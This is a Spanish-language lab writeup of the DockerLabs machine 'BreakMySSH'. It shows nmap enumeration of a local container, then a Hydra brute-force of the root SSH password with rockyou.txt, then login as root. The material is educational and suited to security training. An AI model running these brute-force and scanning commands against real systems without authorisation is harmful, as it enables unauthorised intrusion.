# DockerLabs — BreakMySSH | Writeup

> Writeup de la máquina **BreakMySSH** de la plataforma [DockerLabs](https://dockerlabs.es).
> Autor: **Dani (naanii021)** · Dificultad: **Muy Fácil**

---

## 🗺️ Resumen

| Campo | Valor |
|---|---|
| **Plataforma** | DockerLabs |
| **Máquina** | BreakMySSH |
| **Dificultad** | Muy Fácil |
| **IP objetivo** | `172.17.0.2` |
| **Técnicas clave** | Enumeración de servicios · Fuerza bruta de credenciales SSH (Hydra) |
| **Objetivo** | Conseguir acceso como `root` |

---

## 🚀 Despliegue de la máquina

La máquina se despliega localmente con el script `auto_deploy.sh` de DockerLabs:

```bash
unzip breakmyssh.zip
sudo bash auto_deploy.sh breakmyssh.tar
```

Salida del despliegue:

```
Máquina desplegada, su dirección IP es --> 172.17.0.2
```

---

## 🔍 Fase 1 — Reconocimiento y enumeración

Escaneo completo de puertos con detección de versiones:

```bash
nmap -p- --open -sV -n -Pn 172.17.0.2
```

**Parámetros utilizados:**

- `-p-` → escanea los 65535 puertos.
- `--open` → muestra únicamente los puertos abiertos.
- `-sV` → detecta el servicio y su versión.
- `-n` → desactiva la resolución DNS (más rápido).
- `-Pn` → omite el ping previo (asume el host activo).

**Resultado:**

```
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 7.7 protocol 2.0
```

Un único puerto abierto: **SSH (22)** con **OpenSSH 7.7**.

---

## 🧠 Fase 2 — Análisis del vector de ataque

Comprobamos si la versión tiene vulnerabilidades conocidas:

```bash
searchsploit openssh 7.7
```

Los resultados son todos de tipo **username enumeration** (enumeración de usuarios): permiten descubrir qué usuarios existen, pero **no otorgan acceso** al sistema. Por tanto, la versión de OpenSSH no es explotable de forma directa.

El propio nombre de la máquina —*BreakMySSH*— orienta el vector real: **fuerza bruta de credenciales**. El servicio es seguro, pero si la contraseña es débil, la puerta cede igual.

---

## 💥 Fase 3 — Explotación (fuerza bruta con Hydra)

Se utiliza **Hydra** contra el servicio SSH, probando el usuario `root` frente al diccionario `rockyou.txt`:

```bash
hydra -l root -P /usr/share/wordlists/rockyou.txt -t 4 ssh://172.17.0.2
```

**Parámetros utilizados:**

- `-l root` → prueba el usuario `root` (candidato más probable en Linux).
- `-P /usr/share/wordlists/rockyou.txt` → diccionario de contraseñas comunes.
- `-t 4` → limita a 4 tareas en paralelo (SSH restringe conexiones simultáneas).

> 💡 Si `rockyou.txt` no aparece, se instala con `sudo apt install wordlists` y, si está comprimido, se descomprime con `sudo gunzip /usr/share/wordlists/rockyou.txt.gz`.

**Resultado:**

```
[22][ssh] host: 172.17.0.2   login: root   password: estrella
```

Credenciales encontradas: **`root` : `estrella`**.

*(Captura: salida de Hydra con la contraseña encontrada.)*

---

## 🔑 Fase 4 — Acceso al sistema

Con las credenciales obtenidas, iniciamos sesión por SSH:

```bash
ssh root@172.17.0.2
```

En la primera conexión, SSH solicita confirmar la huella del servidor (`yes`) y a continuación la contraseña (`estrella`).

Verificamos el usuario:

```bash
whoami
# root
```

El prompt cambia a `root@<id>:~#`. El símbolo `#` confirma privilegios de **superusuario**.

🩸 **Acceso como `root` conseguido.**

![alt text](image.png)

---

## 🧹 Limpieza

Para cerrar: `exit` en la sesión SSH y `Ctrl+C` en la terminal donde se ejecutó `auto_deploy.sh` para eliminar el contenedor.

---

## ✅ Conclusión

BreakMySSH demuestra un vector de ataque distinto al de un exploit de versión: **las credenciales débiles**.

1. **Reconocimiento** → `nmap` localiza SSH y su versión.
2. **Análisis** → la versión no es explotable; el vector es la contraseña.
3. **Explotación** → `hydra` encuentra la credencial por fuerza bruta.
4. **Acceso root** → login por SSH con las credenciales obtenidas.

Lección clave: **un servicio actualizado y seguro no protege nada si la contraseña es débil**. La fuerza bruta sobre credenciales comunes sigue siendo una de las causas de brecha más frecuentes en el mundo real.

---

> 📌 *Writeup realizado con fines educativos en un entorno de laboratorio controlado.*
